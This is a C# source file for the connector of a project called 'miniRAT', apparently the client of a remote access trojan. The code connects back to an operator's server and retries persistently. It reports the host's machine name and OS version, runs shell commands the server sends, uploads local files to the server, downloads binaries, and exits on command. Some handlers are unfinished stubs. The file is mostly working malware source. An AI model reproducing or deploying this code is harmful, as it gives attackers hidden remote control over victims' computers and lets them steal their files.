using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;

namespace miniRAT
{
    /// <summary>
    /// Connect to server and send and recive commands
    /// </summary>
    class Connector
    {
        //must be same in client and server
        const string separator = "|||";
        static int clientID = -1;
        static TcpClient tcpClient;
        private static Mutex sendMutex = new Mutex();

        public static Boolean ConnectToServer(string []args)
        {
            string serverAddress = args[0];//get server ip from input
            int port = int.Parse(args[1]);//get port from input
            IPAddress serverIP= DomainResolver.GetServerIP(serverAddress);
            
            if (serverIP == null)
            {
                LogWriter.WriteLog("ConnectToServer: Error serverIP is null");
                return false;
            }

            int waitTime = 0;//Delay before connect
            tcpClient = new TcpClient();

            while (true)
            {
                string results = "";
                try
                {
                    tcpClient = new TcpClient();
                    while (!IsConnected(tcpClient.Client))
                    {
                        Thread.Sleep((int)Math.Pow(2, waitTime) * 1000);
                        if (waitTime < 12)
                            waitTime++;

                        tcpClient = SendHello(serverIP, port);
                    }
                    waitTime = 0;
                    while (IsConnected(tcpClient.Client))
                    {
                        results = sendReciveData(results);
                        if (results == "Server disconnected")
                            break;
                        if (results != "")
                            results = runCommand(tcpClient, results);
                    }
                }
                catch { tcpClient.Close(); }
                finally { GC.Collect(); }
            }

        }
       
        /// <summary>
        /// Connect to server send Hello + password and return TcpClient connection
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        static TcpClient SendHello(IPAddress ip, int port)
        {
            TcpClient clientSocket = new TcpClient();

            try
            {
                clientSocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                clientSocket.Connect(ip, port);
                NetworkStream serverStream = clientSocket.GetStream();


                //Send (clientid<separator>osVersion<separator>clientversion<separator>system name)
                byte[] outStream = Encoding.UTF8.GetBytes(
                    clientID.ToString()+separator+ OS.gtOSversionInfo()+separator+ Assembly.GetExecutingAssembly().GetName().Version.ToString()+separator
                    +Environment.MachineName);

                serverStream.Write(outStream, 0, outStream.Length);
                serverStream.Flush();

                //wait to response be ready
                Thread.Sleep(100);
                //Recive data and get id from server

                byte[] bytes = new byte[4096];
                int byteread = serverStream.Read(bytes, 0, bytes.Length);

                //Decrypt recived data
                byte[] helloBytes = new byte[byteread];
                Array.Copy(bytes, helloBytes, byteread);
                //UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
                //string helloResponse = UTFEncoder.GetString(helloBytes);
                string helloResponse = Encoding.UTF8.GetString(helloBytes);

                string[] stringSeparators = new string[] { separator };
                //response is like: id<separator>Hello
                string[] helloArray = helloResponse.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
                if (helloArray.Length < 2)//error in hello response 
                    throw new Exception("Error in hello response");

                clientID = int.Parse(helloArray[0]);
                Console.WriteLine("Connected to server id= " + clientID.ToString());
            }
            catch  (Exception ex)
            {
                Console.WriteLine("Cannot connect to server: "+ex.Message);
            }
            return clientSocket;
        }
        
        /// <summary>
        /// Send data to server
        /// </summary>
        /// <returns>Send data to server and get command from it.</returns>
        static string sendReciveData(string message)
        {
            if (message != "")
                SendData(message);

            string returndata = "";
            NetworkStream clientStream = tcpClient.GetStream();
            int byteread = 0;
            int microSecondsTimeOut = 60000000;//60 secound

            int timeoutcount = 0;

            while (IsConnected(tcpClient.Client))
            {
                if (tcpClient.Client.Poll(microSecondsTimeOut, SelectMode.SelectRead) == true)//wait for data
                {
                    if (tcpClient.Available == 0)
                    {// Something bad has happened, shut down
                        returndata = "Server disconnected";
                        break;
                    }
                    else if (clientStream.DataAvailable)// There is data waiting to be read"
                    {
                        byte[] bytes = new byte[4096];
                        byteread = clientStream.Read(bytes, 0, bytes.Length);

                        //Decrypt recived data
                        byte[] helloBytes = new byte[byteread];
                        Array.Copy(bytes, helloBytes, byteread);
                        //UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
                        //returndata = UTFEncoder.GetString(helloBytes);
                        returndata = Encoding.UTF8.GetString(helloBytes);
                        break;
                    }

                }
                //false timeout occured, no Action continue
                timeoutcount++;
                if (timeoutcount > 10)//count timeouts if biggr than 10(10 minute elapsed) check server.
                {
                    if (IsServerAlive(tcpClient) == false)
                        return "Server disconnected";
                    else
                        timeoutcount = 0;//Server is Alive and idle, dont want to send command, we must wait.
                }
            }

            return returndata;
        }

        /// <summary>
        /// Wait for Mutex release and connection open then Encrypt and send text to server
        /// </summary>
        /// <param name="message">Mesage</param>
        public static void SendData(string message)
        {
            Boolean sent = false;

            while (!sent)
            {
                try
                {
                    sendMutex.WaitOne();
                    NetworkStream clientStream = tcpClient.GetStream();
                    byte[] outStream = Encoding.UTF8.GetBytes(message);//Encode Message
                    clientStream.Write(outStream, 0, outStream.Length);
                    clientStream.Flush();
                    sent = true;
                }
                finally { sendMutex.ReleaseMutex(); }
            }
        }
        #region File Send and recive

        /// <summary>
        /// Send file in thread and continue running commands
        /// </summary>
        /// <param name="port"></param>
        /// <param name="filepath"></param>
        /// <param name="clientSocke"></param>
        /// <returns></returns>
        private static string GiveFileTCPthread(int port, string filepath, TcpClient clientSocke)
        {
            Thread sthread = new Thread(() => GiveFileTCP(port, filepath, clientSocke));
            sthread.IsBackground = true;
            sthread.Start();
            return "Client send file: ";//send Send File Start
        }
        /// <summary>
        /// Send file to servr by TCP (givefile command)
        /// </summary>
        /// <param name="filepath"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        static void GiveFileTCP(int port, string filepath, TcpClient clientSocket)
        {
            string results = "Give file";
            //it's seems use IP not UDP
            FileInfo fi = new FileInfo(filepath);
            if (!fi.Exists)//file don't exists
            {
                SendData("File dosn't exists: " + filepath);
                return;
            }

            FileStream fs = null;
            NetworkStream clientStream = null;
            try
            {
                IPEndPoint end = (IPEndPoint)clientSocket.Client.LocalEndPoint;
                TcpClient fileClient = new TcpClient(end.Address.ToString(), port);
                clientStream = fileClient.GetStream();
                fs = new FileStream(filepath, FileMode.Open);
                byte[] data = new byte[fs.Length];
                fs.Read(data, 0, (int)fs.Length);
                clientStream.Write(data, 0, data.Length);
                clientStream.Flush();
                fs.Close();

                results = string.Format("<< Client: File {0} was sent, size = {1} byte ", filepath, data.Length);
            }
            catch (Exception ex)
            {
                results = "Error in sending file in client side occured. " + ex.Message;
            }
            finally
            {
                if (fs != null)
                    fs.Close();
                if (clientStream != null)
                    clientStream.Close();
                SendData(results);
            }
        }
        /// <summary>
        /// Get File and save it in reverse mode.
        /// </summary>
        /// <param name="server"></param>
        /// <param name="port"></param>
        /// <param name="filename"></param>
        /// <param name="run"></param>
        /// <returns></returns>
        static string GetFile(EndPoint server, int port, string filename, Boolean run = false)
        {
            byte[] incomming = GetBinary(server, port);
            try
            {
                if (incomming == null)
                    return "Client: Error in recive file in client, size is 0";

                FileStream f = new FileStream(Directory.GetCurrentDirectory() + @"\" + filename, FileMode.Create);
                f.Write(incomming, 0, incomming.Length);
                f.Close();
                return "Client: " + filename + " << was recived, and save.";
            }
            catch (Exception x)
            { return "Error in recive file in client " + x.Message; }
        }

        /// <summary>
        /// Connect to server(reverse mode) and recive Data file(byte).
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <param name="filename"></param>
        /// <param name="run">If true run binary file, else save file </param>
        /// <returns></returns>
        static byte[] GetBinary(EndPoint server, int port)
        {
            TcpClient client = new TcpClient();
            IPEndPoint ip = (IPEndPoint)server;

            try
            {
                client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                client.Connect(ip.Address, port);

                NetworkStream clientStream = client.GetStream();
                int byteread = 0;
                byte[] bytes = new byte[4096];
                MemoryStream ms = new MemoryStream();
                clientStream.ReadTimeout = 180000;//TODO: decide on it 180 secound 

                do
                {
                    byteread = clientStream.Read(bytes, 0, bytes.Length);
                    ms.Write(bytes, 0, byteread);
                } while (byteread > 0);

               Console.WriteLine("Byte Read=" + bytes.Length.ToString());
               Console.WriteLine("DATA Avail:" + clientStream.DataAvailable);

                clientStream.Close();
                client.Close();

                //Return recived data
                return ms.ToArray();
            }
            finally
            { client.Close(); }
        }
        #endregion
        #region Check Server Status
        /// <summary>
        /// Send IsServerAlive to server if no result or incorrect result retuen false.
        /// </summary>
        /// <returns>IsServerAlive</returns>
        public static Boolean IsServerAlive(TcpClient clientSocket)
        {
            try
            {
                NetworkStream clientStream = clientSocket.GetStream();

                SendData("IsServerAlive");

                int microSecondsTimeOut = 30000000;//30 secound
                if (clientSocket.Client.Poll(microSecondsTimeOut, SelectMode.SelectRead) == true)//wait for data
                {
                    if (clientSocket.Available == 0)
                    {// Something bad happened, shut down
                        Console.WriteLine(DateTime.Now.ToString() + " Server Is Dead ");
                        return false;
                    }
                    else if (clientStream.DataAvailable)// There is data waiting to be read"
                    {
                        byte[] bytes = new byte[4096];
                        int byteread = clientStream.Read(bytes, 0, bytes.Length);
                        //Decrypt recived data
                        byte[] helloBytes = new byte[byteread];
                        Array.Copy(bytes, helloBytes, byteread);
                        //UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
                        //string incomming = UTFEncoder.GetString(helloBytes);
                        string incomming = Encoding.UTF8.GetString(helloBytes);
                        if (incomming == "IamAlive")
                        {
                            Console.WriteLine(DateTime.Now.ToString() + "  Hoora! Server Is Alive, Continue ");
                            return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }
        public static bool IsConnected(Socket socket)
        {
            try
            {
                Boolean re = !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
                Boolean cn = socket.Connected;
                return (cn && re);
            }
            catch { return false; }
        }
        #endregion
        /// <summary>
        /// Run server command.
        /// </summary>
        /// <param name="command">Command is like: cmd<separator>dir OR screenshot OR version.</param>
        /// <returns>results of command</returns>
        public static string runCommand(TcpClient client, string command)
        {
            //Command is like: run<separator>cmd<separator>/c whoami OR screenshot<separator>port OR version
            string[] commandArray = command.Split(new string[] { separator }, StringSplitOptions.None);

            try
            {
                switch (commandArray[0])
                {
                    case "version":
                        return Assembly.GetExecutingAssembly().GetName().Version.ToString();
                    case "powershell":
                        return "todo powershell"; //TODO: run powershell
                    case "run":
                        return RUN.runThread(commandArray[1], commandArray[2]);
                    case "clientpath":
                        return AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
                    case "killyourself":
                        Console.WriteLine("I must go. BYE");
                        Environment.Exit(0);
                        return "Error, I can't Kill my self !!!!";
                    case "givefile":
                        return "TODO givefile"; //TODO:give file download<separator>port<separator>filePath
                    case "getfile":
                        return "TODO getfile"; //TODO:get file download<separator>port<separator>filePath
                    case "testlive":
                        return "isAlive";
                    default:
                        return "Unknown Command: " + commandArray[0];
                }
            }
            catch (Exception ex)
            { return ex.Message; }
        }
    }
}
